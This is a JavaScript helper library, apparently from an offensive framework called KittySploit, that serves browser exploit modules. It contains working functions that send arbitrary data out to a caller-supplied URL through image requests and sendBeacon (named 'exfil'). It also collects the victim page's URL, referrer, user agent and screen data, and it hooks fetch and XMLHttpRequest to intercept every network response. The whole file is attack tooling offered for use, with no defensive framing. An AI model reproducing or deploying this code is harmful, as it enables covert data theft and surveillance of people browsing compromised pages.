// KittySploit Browser Generic Library v1
// Shared helpers for browser_exploits modules.
(function (global) {
  'use strict';

  if (!global.KS) {
    global.KS = {};
  }

  if (!global.KS.util) {
    global.KS.util = {};
  }

  global.KS.util.version = '1.1.0';

  global.KS.util.now = function () {
    return Date.now ? Date.now() : new Date().getTime();
  };

  global.KS.util.randomId = function (prefix) {
    var p = prefix || 'ks';
    return p + '_' + Math.random().toString(36).slice(2) + '_' + global.KS.util.now();
  };

  global.KS.util.onReady = function (callback) {
    if (document.readyState === 'complete' || document.readyState === 'interactive') {
      callback();
      return;
    }
    document.addEventListener('DOMContentLoaded', callback, { once: true });
  };

  global.KS.util.safeStringify = function (value) {
    try {
      return JSON.stringify(value);
    } catch (e) {
      return '"[unserializable]"';
    }
  };

  global.KS.util.exfil = function (url, data) {
    try {
      var payload = typeof data === 'string' ? data : global.KS.util.safeStringify(data);
      var sep = url.indexOf('?') === -1 ? '?' : '&';
      var img = new Image();
      img.src = url + sep + 'd=' + encodeURIComponent(payload);
      return true;
    } catch (e) {
      return false;
    }
  };

  global.KS.util.exfilBeacon = function (url, data) {
    try {
      if (navigator && typeof navigator.sendBeacon === 'function') {
        var payload = typeof data === 'string' ? data : global.KS.util.safeStringify(data);
        return navigator.sendBeacon(url, payload);
      }
      return false;
    } catch (e) {
      return false;
    }
  };

  global.KS.util.http = function (url, options) {
    if (typeof fetch === 'function') {
      return fetch(url, options || {})
        .then(function (res) { return res.text(); })
        .catch(function () { return null; });
    }
    return Promise.resolve(null);
  };

  global.KS.util.httpJson = function (url, options) {
    if (typeof fetch === 'function') {
      return fetch(url, options || {})
        .then(function (res) { return res.json(); })
        .catch(function () { return null; });
    }
    return Promise.resolve(null);
  };

  global.KS.util.captureMeta = function () {
    var data = {};
    try {
      data.url = String(location.href || '');
      data.title = String(document.title || '');
      data.referrer = String(document.referrer || '');
      data.userAgent = String(navigator.userAgent || '');
      data.language = String(navigator.language || '');
      data.screen = {
        w: window.screen ? window.screen.width : 0,
        h: window.screen ? window.screen.height : 0
      };
      data.viewport = {
        w: window.innerWidth || 0,
        h: window.innerHeight || 0
      };
    } catch (e) {
      return data;
    }
    return data;
  };

  global.KS.util.hookFetch = function (onResponse) {
    if (typeof fetch !== 'function') {
      return false;
    }
    if (global.KS.util._fetchHooked) {
      return true;
    }
    var originalFetch = fetch;
    global.KS.util._fetchHooked = true;
    global.fetch = function () {
      return originalFetch.apply(this, arguments).then(function (res) {
        try {
          if (typeof onResponse === 'function') {
            onResponse(res);
          }
        } catch (e) {
          // ignore
        }
        return res;
      });
    };
    return true;
  };

  global.KS.util.hookXHR = function (onResponse) {
    if (!global.XMLHttpRequest || global.KS.util._xhrHooked) {
      return false;
    }
    global.KS.util._xhrHooked = true;
    var OriginalXHR = XMLHttpRequest;
    global.XMLHttpRequest = function () {
      var xhr = new OriginalXHR();
      xhr.addEventListener('load', function () {
        try {
          if (typeof onResponse === 'function') {
            onResponse(xhr);
          }
        } catch (e) {
          // ignore
        }
      });
      return xhr;
    };
    global.XMLHttpRequest.prototype = OriginalXHR.prototype;
    return true;
  };

  global.KS.util.log = function () {
    if (global.KS.util.silent) {
      return;
    }
    if (typeof console !== 'undefined' && console.log) {
      console.log.apply(console, arguments);
    }
  };
})(window);
